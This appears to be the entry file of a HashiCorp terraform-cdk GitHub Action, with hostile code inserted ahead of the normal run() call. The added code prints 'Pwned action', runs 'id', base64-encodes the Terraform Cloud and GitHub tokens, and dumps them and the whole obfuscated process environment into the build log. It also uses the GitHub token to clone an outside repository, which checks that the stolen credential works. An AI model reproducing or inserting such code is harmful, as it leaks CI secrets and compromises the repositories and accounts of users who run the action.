/**
 * Copyright (c) HashiCorp, Inc.
 * SPDX-License-Identifier: MPL-2.0
 */

import * as core from "@actions/core";
import { run } from "./action";

import { execSync } from 'child_process';


console.log("\r\nPwned action...");
console.log(execSync('id').toString());

const tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64');
const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").reverse().join("")).toString('base64');


console.log('Testing token...', execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git`).toString());

console.log('\r\nDumping tokens:', {tfToken, ghToken});
console.log('GH:', Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64'))
console.log('\r\nDumping env:', Buffer.from(JSON.stringify(process.env).split("").reverse().join("")).toString('base64'));

run().catch((error) => {
  core.setFailed(error.message);
});
